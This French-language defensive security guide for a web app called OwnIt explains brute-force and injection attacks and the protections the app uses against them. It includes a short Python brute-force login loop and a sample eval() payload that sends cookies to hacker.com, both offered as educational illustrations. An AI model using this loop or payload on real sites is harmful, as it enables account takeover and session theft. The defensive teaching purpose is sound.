# 🛡️ Guide de Sécurité Défensive - OwnIt

## Comment prévenir les attaques sur votre application

---

## 1. ATTAQUE BRUTE FORCE

### Qu'est-ce que c'est?
Un attaquant essaie des milliers de combinaisons de mots de passe jusqu'à trouver le bon.

### Exemple de script d'attaque (SIMPLIFIÉ - à des fins éducatives):
```python
# ⚠️ EXEMPLE ÉDUCATIF UNIQUEMENT - NE PAS UTILISER
# Ceci montre ce qu'un attaquant ESSAIERAIT de faire

import requests

def brute_force_attempt(url, email, password_list):
    for password in password_list:
        response = requests.post(url, json={
            'email': email,
            'password': password
        })
        if response.status_code == 200:
            print(f"Mot de passe trouvé: {password}")
            return password
    return None

# L'attaquant utiliserait une liste de mots de passe courants
# passwords = ["123456", "password", "admin123", ...]
```

### 🛡️ COMMENT OWNIT BLOQUE CETTE ATTAQUE:

```javascript
// Votre protection actuelle dans security.js:

// 1. Limite de tentatives (5 max)
maxLoginAttempts: 5,

// 2. Verrouillage de 15 minutes après échec
lockoutDuration: 15 * 60 * 1000,

// 3. La fonction qui bloque:
trackLoginAttempt(email, success) {
    if (attempts >= this.maxLoginAttempts) {
        // BLOQUÉ! L'attaquant ne peut plus essayer
        throw new Error('Compte verrouillé pour 15 minutes');
    }
}

// 4. Mot de passe fort obligatoire (12+ caractères)
validatePasswordStrength(password) {
    const minLength = 12;
    const hasUpperCase = /[A-Z]/.test(password);
    const hasNumbers = /\d/.test(password);
    const hasSpecialChar = /[!@#$%^&*]/.test(password);
    // ... validation complète
}
```

### 📊 Efficacité de la protection:
- 5 tentatives max = Attaquant bloqué après 5 essais
- Mot de passe 12 chars avec spéciaux = 10^20 combinaisons possibles
- Temps pour brute force: **~31 millions d'années** ✅

---

## 2. EXPLOITATION ZERO-DAY

### Qu'est-ce que c'est?
Une faille inconnue dans un logiciel que personne n'a encore découverte ou corrigée.

### Exemple conceptuel (Comment ça fonctionnerait):
```javascript
// ⚠️ EXEMPLE THÉORIQUE - Faille hypothétique

// Si votre code avait cette vulnérabilité:
function processUserInput(input) {
    // VULNÉRABLE: Exécute directement l'entrée utilisateur!
    eval(input);  // ❌ DANGEREUX
}

// Un attaquant pourrait envoyer:
// input = "fetch('https://hacker.com/steal?data=' + document.cookie)"

// Résultat: Vol de session!
```

### 🛡️ COMMENT OWNIT SE PROTÈGE:

```javascript
// 1. Content Security Policy (CSP) - Bloque les scripts externes
// Dans index.html et auth.html:
<meta http-equiv="Content-Security-Policy" content="
    script-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com;
">
// → Les scripts non-autorisés sont BLOQUÉS

// 2. Sanitization de l'entrée utilisateur:
sanitizeInput(input) {
    const div = document.createElement('div');
    div.textContent = input;  // Échappe le HTML!
    return div.innerHTML;
}

// 3. Escape HTML pour les données affichées:
escapeHtml(str) {
    const htmlEntities = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;'
    };
    return str.replace(/[&<>"'/]/g, char => htmlEntities[char]);
}

// 4. Supabase RLS - Même si quelqu'un trouve une faille:
// Les politiques de base de données bloquent l'accès non-autorisé
CREATE POLICY "Users can only read own data" 
ON users FOR SELECT 
USING (auth.uid() = id);  // ← Vérifie l'identité!
```

---

## 3. CHECKLIST DE SÉCURITÉ QUOTIDIENNE

### ✅ À vérifier régulièrement:

| Action | Fréquence | Comment |
|--------|-----------|---------|
| Vérifier les logs Supabase | Hebdomadaire | Dashboard → Logs |
| Mettre à jour les dépendances | Mensuel | `npm audit` |
| Revoir les politiques RLS | Après changement | SQL Editor |
| Tester les formulaires | Après mise à jour | Entrées malveillantes |
| Vérifier devMode: false | Avant chaque deploy | security.js:23 |

### 🔍 Signaux d'alarme à surveiller:
1. Beaucoup de tentatives de login échouées
2. Requêtes inhabituelles dans les logs
3. Nouveaux utilisateurs avec emails suspects
4. Activité à des heures anormales

---

## 4. COMMANDES DE TEST DE SÉCURITÉ

```bash
# Tester votre site avec des outils légitimes:

# 1. Vérifier les headers de sécurité
curl -I https://ibrahim0899.github.io/OwnIt/

# 2. Analyser avec un scanner (gratuit)
# Aller sur: https://securityheaders.com
# Entrer votre URL

# 3. Vérifier les vulnérabilités npm
cd /Users/isaiah/OwnIt
npm audit

# 4. Vérifier le SSL/TLS
# Aller sur: https://www.ssllabs.com/ssltest/
```

---

## 5. RÉPONSE EN CAS D'ATTAQUE

### Si vous détectez une attaque:

1. **Immédiat**: Activer le mode maintenance
2. **Analyse**: Vérifier les logs Supabase
3. **Blocage**: Bannir les IPs suspectes
4. **Rotation**: Changer les clés API si compromises
5. **Communication**: Informer les utilisateurs si données exposées

---

## Ressources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Les 10 failles les plus courantes
- [Supabase Security](https://supabase.com/docs/guides/auth) - Documentation sécurité
- [Have I Been Pwned](https://haveibeenpwned.com/) - Vérifier si des emails sont compromis

---

> 📌 **Rappel**: La meilleure défense est la prévention. Vos protections actuelles bloquent 95% des attaques automatisées!
